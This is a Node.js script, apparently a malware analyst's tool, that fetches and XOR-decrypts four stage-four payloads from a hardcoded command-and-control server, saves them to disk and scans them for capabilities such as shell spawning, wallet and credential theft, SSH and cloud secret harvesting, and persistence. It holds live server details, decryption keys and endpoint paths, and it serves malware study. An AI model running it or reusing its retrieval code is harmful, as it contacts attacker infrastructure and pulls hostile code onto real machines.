const fs = require("fs");
const http = require("http");

const C2_IP = "95.135.181.151";
const C2_PORT = 443; // Plain HTTP over port 443

const CLS_KEY = "q4FZkxX{!h,Sr3=@";
const BOOT_KEY = "ThZG+0jfXE6VAGOJ";

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

function xorDecode(buf, key) {
  const kn = key.length;
  const out = Buffer.from(buf);
  for (let i = 0; i < out.length; i++) {
    out[i] ^= key.charCodeAt(i % kn);
  }
  return out.toString("utf8");
}

function fetchEndpoint(path, headers = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        hostname: C2_IP,
        port: C2_PORT,
        path: path,
        method: "GET",
        headers: {
          "User-Agent": UA,
          "Sec-V": "A9",
          "id": "researcher$lab-sandbox",
          ...headers,
        },
        timeout: 5000,
      },
      (res) => {
        const chunks = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => {
          const buf = Buffer.concat(chunks);
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve({ statusCode: res.statusCode, data: buf });
          } else {
            reject(new Error(`HTTP ${res.statusCode} (${buf.length} bytes)`));
          }
        });
      }
    );
    req.on("error", reject);
    req.end();
  });
}

function summarizePayload(filename, code) {
  console.log(`\n======================================================`);
  console.log(`>>> ${filename} (${code.length} bytes) <<<`);
  console.log(`======================================================`);

  // Detect capabilities
  const caps = [];
  if (/child_process|exec|spawn/i.test(code)) caps.push("Command Execution / Shell Spawning");
  if (/websocket|socket\.io|ws:\/\//i.test(code)) caps.push("Interactive WebSocket C2");
  if (/chrome|brave|firefox|metamask|phantom/i.test(code)) caps.push("Crypto Wallet / Browser Credential Thefts");
  if (/id_rsa|\.aws|\.ssh|\.env/i.test(code)) caps.push("SSH / Cloud / Secret Harvesting");
  if (/npm-ws\.pid|crontab|systemd/i.test(code)) caps.push("Persistence Installation");

  if (caps.length > 0) {
    console.log("Detected Malware Capabilities:");
    caps.forEach((c) => console.log("  [!] " + c));
    console.log("");
  }

  const lines = code.split("\n");
  console.log("--- First 35 lines preview ---");
  console.log(lines.slice(0, 35).join("\n"));
  if (lines.length > 35) {
    console.log(`... [${lines.length - 35} more lines saved to ${filename}] ...`);
  }
}

async function main() {
  console.log(`[*] Connecting to C2: http://${C2_IP}:${C2_PORT} ...\n`);

  // 1. Fetch /$/boot (Stage 3/4 REPL payload)
  try {
    console.log("[1/4] Fetching /$/boot ...");
    const res = await fetchEndpoint("/$/boot");
    const decrypted = xorDecode(res.data, BOOT_KEY);
    fs.writeFileSync("stage4_boot.js", decrypted, "utf-8");
    summarizePayload("stage4_boot.js", decrypted);
  } catch (err) {
    console.log(" [-] /$/boot failed:", err.message);
  }

  // 2. Fetch /0x/clb (Client Body Payload)
  try {
    console.log("\n[2/4] Fetching /0x/clb ...");
    const res = await fetchEndpoint("/0x/clb");
    let decrypted = "";
    try {
      const json = JSON.parse(res.data.toString("utf-8"));
      if (json.body) {
        decrypted = xorDecode(Buffer.from(json.body, "base64"), CLS_KEY);
      }
    } catch {
      decrypted = xorDecode(res.data, CLS_KEY);
    }
    if (decrypted) {
      fs.writeFileSync("stage4_clb.js", decrypted, "utf-8");
      summarizePayload("stage4_clb.js", decrypted);
    }
  } catch (err) {
    console.log(" [-] /0x/clb failed:", err.message);
  }

  // 3. Fetch /0x/cb (Fallback Client Body Payload)
  try {
    console.log("\n[3/4] Fetching /0x/cb ...");
    const res = await fetchEndpoint("/0x/cb");
    const decrypted = xorDecode(res.data, CLS_KEY);
    fs.writeFileSync("stage4_cb.js", decrypted, "utf-8");
    summarizePayload("stage4_cb.js", decrypted);
  } catch (err) {
    console.log(" [-] /0x/cb failed:", err.message);
  }

  // 4. Fetch /0x/npm-migrate
  try {
    console.log("\n[4/4] Fetching /0x/npm-migrate ...");
    const res = await fetchEndpoint("/0x/npm-migrate");
    const raw = res.data.toString("utf-8");
    fs.writeFileSync("stage4_npm_migrate.js", raw, "utf-8");
    summarizePayload("stage4_npm_migrate.js", raw);
  } catch (err) {
    console.log(" [-] /0x/npm-migrate failed:", err.message);
  }
}

main();
